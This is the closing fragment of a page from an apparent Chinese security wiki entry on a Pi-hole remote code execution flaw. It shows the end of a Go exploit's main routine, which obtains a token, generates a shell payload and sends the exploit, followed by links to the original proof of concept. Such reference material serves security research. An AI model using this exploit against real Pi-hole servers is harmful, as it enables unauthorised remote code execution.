    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Getting Token...&quot;</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">:=</span> <span class="n">getToken</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Token:&quot;</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Generating payload...&quot;</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">:=</span> <span class="n">generate_shell</span><span class="p">()</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Payload generated:&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Sending exploit...&quot;</span><span class="p">)</span>
    <span class="n">Exploit</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">&quot;Exploit executed, check your session&quot;</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div>

<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.freebuf.com/vuls/234533.html">https://www.freebuf.com/vuls/234533.html</a></p>
<p><a href="https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go">https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-13051%EF%BC%89Pi-Hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-13051%EF%BC%89Pi-Hole%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-13051）Pi-Hole 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
        Phpweb 前台getshell
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>